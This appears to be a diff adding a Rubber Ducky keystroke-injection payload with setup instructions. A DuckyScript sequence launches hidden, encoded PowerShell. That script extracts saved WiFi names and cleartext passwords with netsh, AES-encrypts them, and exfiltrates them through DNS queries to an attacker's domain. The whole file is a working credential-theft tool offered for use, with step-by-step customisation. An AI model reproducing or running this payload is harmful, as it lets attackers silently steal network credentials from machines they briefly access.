@@ -1,0 +1,74 @@
+# Title:         Exfiltrate WiFi names and preshared keys via AES-256 Encrypted DNS  
+# Description:   Exfiltrates WiFi names and PSK using DNS where the data in transit is encrypted with AES-256 
+# Author:        Keld Norman / Twitter: @keld_norman
+# Props:         Google, RTFM, weeks og trial and errors
+# Version:       1.0
+# Category:      Encrypted WiFi Exfiltration
+# Target:        Windows10+ Powershell
+# Attackmodes:   HID
+#-----------------------------------------------------------------------------------------------------------
+# You need a server to receive and decrypt the data exfiltrated by this script
+# See the README for how to set up such a server.
+#-----------------------------------------------------------------------------------------------------------
+# Quick Guide
+#-----------------------------------------------------------------------------------------------------------
+
+1. Alter the $KEY="xxxxxx" at the bottom of the powershell code to your own password you want to use for the encryption
+2. Alter the $SUB=".i.yourdomain.com" to your own domain with the NS record pointing to "i.yourdomain.com"
+3. Open a powershell terminal on your PC, paste in from $scriptblock to the end (also the two extra lines below the script block)
+4. The last line called $encoded will produce an output that is the powershell code in an encoded form
+4. Use the encoded powershell code in the command below ( paste it in as a replacement for the PUT-THE-ENCODED-CODE-HERE string
+
+DUCKY_LANG US
+GUI R
+DELAY 2
+STRING cmd.exe
+DELAY 1
+ENTER
+STRING powershell.exe -windowstyle hidden -NoProfile -EncodedCommand PUT-THE-ENCODED-CODE-HERE
+ENTER
+
+#-----------------------------------------------------------------------------------------------------------
+# COPY THIS AND PASTE IT IN TO A POWERSHELL TERMINAL ON YOUR OWN WINDOWS PC
+#-----------------------------------------------------------------------------------------------------------
+ 
+$scriptblock={     
+ function enc{[CmdletBinding()][OutputType([string])]
+  Param([Parameter(Mandatory=$true)][String]$K,[Parameter(Mandatory=$true)][String]$T)  
+  $sha=New-Object System.Security.Cryptography.SHA256Managed
+  $aes=New-Object System.Security.Cryptography.AesManaged
+  $aes.Mode=[System.Security.Cryptography.CipherMode]::CBC
+  $aes.Padding=[System.Security.Cryptography.PaddingMode]::Zeros
+  $aes.BlockSize=128
+  $aes.KeySize=256
+  $aes.Key=$sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($K))
+  $byt=[System.Text.Encoding]::UTF8.GetBytes($T)
+  $cry=$aes.CreateEncryptor()
+  $enc=$cry.TransformFinalBlock($byt,0,$byt.Length)
+  $enc=$aes.IV+$enc
+  $aes.Dispose()
+  $sha.Dispose()
+  $b64=[System.Convert]::ToBase64String($enc).ToCharArray()
+  foreach ($hx in $b64){$hex=$hex+[System.String]::Format("{0:X}",[System.Convert]::ToUInt32($hx))}
+  return $hex
+ }
+ function dns{
+  $tik=Get-Date -UFormat "%j%H%M%S"
+  $subchars=get-random -minimum 26 -maximum 50
+  [regex]::split($_, "(.{$subchars})")|? {$_}|%{Resolve-DnsName -Name $(-join("T",$tik,".",$_,$SUB)) -Type A -QuickTimeout -ErrorAction SilentlyContinue -DnsOnly}
+  start-sleep -Seconds $(get-random -minimum 1 -maximum 5)
+ }
+ function wifi {
+  $wifinames=netsh wl sh pr|sls "\:(.+)$"|%{$name=$_.Matches.Groups[1].Value.Trim();$_}|%{(netsh wl sh pr n="$name" k=clear)}|sls "Key Content\W+\:(.+)$"|%{$pass=$_.Matches.Groups[1].Value.Trim(); $_}|%{[PSCustomObject]@{A=$name;B=$pass}}|ConvertTo-Csv -NTI -Delimiter ";"|Select -Skip 1
+  $wifinames.trim()
+ }
+ $KEY="EncryptDataWithThisCode"
+ $SUB=".i.yourdomain.com"
+ wifi|%{enc -K "$KEY" -T "$_"}|%{dns "$_"}|out-null
+}
+$encoded = [convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptblock))
+$encoded
+
+#-----------------------------------------------------------------------------------------------------------
+# END OF STORY
+#-----------------------------------------------------------------------------------------------------------
